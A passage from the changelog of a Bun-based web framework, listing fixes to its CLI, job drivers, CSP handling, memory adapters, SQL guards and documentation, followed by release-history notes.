  read, and the emitted `X_PWA_SYNC_INCOMPLETE` fix told the reader to raise
  `pwa.backgroundSync.retry.maxAttempts` — a key `PwaConfig` has never carried, because
  `backgroundSync` is a boolean. Delete the import; there is nothing to replace it with, and
  `wiki/Error-Codes.md` already said so.
- `@ultimat3/mcp` audits the resource surface: `auditResourceRead` / `McpResourceAuditEntry`, log
  event `mcp.resource-read.<outcome>` for hidden, scope-denied, ok and failed — an enumeration alert
  should match `mcp.tool-call.*` **and** `mcp.resource-read.*`. `resources/list` stays silent, as
  `tools/list` does: a pre-filtered list reveals nothing the caller cannot already read.
- Admin over MCP carries the operator's `orgId` to every authz decision and into the ambient
  actor; it was dropped at both hops, so an org-scoped rule could not fire and entity tenancy
  derived no predicate (26 of 26 decisions measured with `orgId` absent).
- `bun run secret-compare` reads names case-insensitively, as its comment always claimed:
  `SESSION_SECRET`, `API_KEY`, `CSRF_TOKEN`, `password`, `otp` were invisible to it. The suffix
  rule requires a boundary so a bare `key` stays out. Two new pins (`storage`, a published dev
  literal; `core`, a PNG magic number).
- Every sort that is projected into a committed artifact is a code-unit compare: the service
  worker's route table, the precache manifest, `docs-search`'s tie-break and `docs-scan`'s corpus
  were `localeCompare`, an ICU property the file headers' byte-identical promise denied.
- The memory job driver clears `visibleAt` / `claimedBy` on ack and nack, as `SQL_ACK` / `SQL_NACK`
  do; `x jobs show` under `x dev` reported a settled job as still leased.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **`maxConnections` is re-asked after `authenticate` resolves**, beside the readiness recheck that
  already was. Read once, the cap decided against a socket count that was already history: a restart
  storm parks every client of a dead node in the token service at once, and `maxConnections: 2` with
  ten parked upgrades took ten sockets — reproduced, `upgraded 10, shed 0`.
- **A worker's fleet slot is released before the driver closes.** `void fleetSlots.release(...)` left
  the `x_job_leases` DELETE on the wire when the teardown returned, so the row held its slot for a
  full TTL and a `concurrency: 1` job was unclaimable by the replacement pod for one visibility
  window after every deploy.
- **A lease/slot renewal interval is `unref`ed.** Armed from inside a job run, a refed one was the
  single thing holding a drained process open — past every phase of the shutdown, until SIGKILL —
  once the drain abandoned the hook that would have stopped it.
- **A replayed backfill batch writes no ledger row.** `ledger.progress` sits outside `step.run`, so a
  resumed pass re-issued one `x_backfills` UPDATE per already-completed batch before reading a single
  new row — 4,800 statements on a 5M-row sweep killed at batch 4,800, on every attempt, inside the
  visibility lease. The value is absolute, so the first batch that runs reports everything behind it.
- A dynamic `static` route was always `X_BUDGET_UNMEASURED`: the prerender recorded the filled path
  (`/blog/hello`) and the budget looked up the pattern (`/blog/:slug`). One row per route, heaviest
  page wins.
- A urlencoded or multipart body collapsed a repeated field (`tags` ×3 → `'c'`) where the query
  parser built an array; one collector now serves all three.
- `bunx create-ultimate` with no name told the reader to run `x new myapp` — `x` is by definition
  not installed yet; the fix line names the invocation used.
- `examples/dummy`'s island-bytes test pinned byte equality on an island whose graph reaches a
  `sideEffects`-declared module, which Bun 1.4.0's tree-shaker drops about one build in sixty
  (#273, #276); the classification is now derived from each island's import graph, equality is
  asserted on the pure ones and a documented band on the rest.
- `/_x` stayed unstyled for the process life after one transient `@ultimat3/ui` import failure;
  the rejection is no longer memoised.
- `x new <name>` was lint-red on run one whenever the name sorted after `ultimat3`: every
  template emitted the `@<app>/…` import above `@ultimat3/…`, the only order Biome's
  `organizeImports` accepts for names a–t. `sortedImports` orders every emitted block;
  `generate-format.test.ts` now scaffolds `zebra-demo` through the real Biome.
- `x new /abs/path` slugified the path into a directory inside the current repository and
  `git init`ed it. It is refused with the invocation meant: `x new <name> --dir <path>`.
- One documented first run: `x new`'s closing line said `bun install && x db gen … && x dev`
  while the scaffold's own README and CI say `bin/setup`. Eight doc pages told readers
  `cd myapp && x dev`, which fails on `X_BUILD_FAILED` because `x new` installs nothing — every
  one now says `bin/setup`. `wiki/Installation.md` listed six `x new` flags that do not exist.
- Docs falsified against 10.0.0 and corrected: `realtime.tier` (deleted — tier 3 is
  `persist: true` on a query), `ServeOptions.runtime`, the jobs driver seam, the shared
  rate-limit store, the `x dev` transcript, `.x/pgdata`, the tutorial's file and step counts.
- The memory entity driver answered `eq null` / `neq null` / `in [null]` differently from Postgres
  for a column the row never named — reachable through the repo/seed seam and, always, through a
  NULL money column's parts. Absent and NULL are now one value to every predicate, as the file's
  own header promised.
- `memoryRepo.updateWhere` judged a cross-tenant patch per merged row, so a filter matching zero
  rows answered `0` where Postgres throws `X_TENANCY_ROW_MISMATCH`. The patch is judged first,
  on both drivers.
- `MemoryAdapter.createUser` refused a second user with `externalId: null`, which every OAuth
  sign-up without an external-id grant passes — the second first-time OAuth user on a memory-backed
  app failed `X_AUTH_WRITE_FAILED`. `x_users.external_id` is `text unique`, NULLS DISTINCT, and the
  adapter now agrees. `takeVerification` stamped `consumedAt` with the issue time; it reads a clock
  — **`new MemoryAdapter(clock?)`**, defaulting to the system clock.
- `beginStatement` interpolated `options.isolation` into `raw()` SQL; the three levels are now
  re-derived from the closed set and anything else is `X_SQL_UNSAFE`.
- `readOnlyQuery('select 1; -- note')` passed the one-statement guard and then emitted
  `DECLARE … CURSOR FOR select 1; -- note`, an uncoded driver error. The cursor splices the
  splitter's own first statement.
- `createLogger({ level: 'verbose' })` built a logger that failed **open** (every level emitted).
  An unknown level is refused at construction; `LOG_LEVEL` from the environment is still filtered.
- `seriesKey` in `@ultimat3/core` metrics was not injective across attribute values carrying the
  pair separators; two label sets could merge into one series.
- `escapeXml` left XML-1.0-illegal control characters verbatim, so one byte in a feed item's title
  made the whole document not well-formed; they are stripped in element text, attributes and CDATA.
- `defineAuth()` retained two limiters per call for the life of the process; one per distinct
  window is kept.
- `srcsetFor` in `@ultimat3/ui` emitted a variant `src` holding whitespace or a leading/trailing
  comma verbatim, which the browser parses as a different URL and drops in silence; it is now
  `X_UI_INVALID_VALUE`.
- `x db backfill <name> --list` silently dropped the positional and listed the whole ledger with
  `ok: true`. It is now `X_CLI_BAD_FLAG`, with `--name` as the fix.

### Commits

- fix: the CSP admits its own hydration runtime, cache-control has one owner, ISR keys by locale, and the drain reaches the exit (#328)
- docs: the range — homework to very large, measured at both ends — and fifteen pages corrected against 10.0.0 (#327)
- fix: error pages a browser can read and an app can override, X_LIVE_ROUTE_NO_ISLAND, and two audit sweeps (tiers 0–2, 3–5) (#326)
- fix: a server render gets a live client, fix: paths must resolve, /favicon.ico answers, and the ui runtime slot (#271 #272 #274 #275 #283) (#325)

## Older releases

`10.0.0` and everything before it are **in git history, not in this file**. This file is capped at
1,000 lines: a changelog nobody scrolls to the bottom of is a changelog nobody reads, and every
deleted line is one `git show` away.

| Want | Run |
|---|---|
| one past release's section | `git show v10.0.0:CHANGELOG.md` — or any tag; every release from 1.0.0 on is tagged |
| when a line was written, and by whom | `git log -p --follow -- CHANGELOG.md` |
| the whole file as it stood at the last full release | `git show v13.0.0:CHANGELOG.md` |
| what a major broke, without git | [`wiki/Upgrading.md`](https://github.com/developerz-ai/ultimate/wiki/Upgrading) — it walks **every** major, oldest first, and is deliberately NOT truncated |

**The upgrade guide is the one that has to stay complete**, and it does: a reader upgrading across
four majors needs every walkthrough in order, where a reader of this file wants the last release.
Two documents, two jobs — `bun run changelog-check` reads the oldest `## X.Y.Z` heading still here
as the retention boundary and stops demanding a section below it, so trimming this file again is
deleting sections and nothing else.
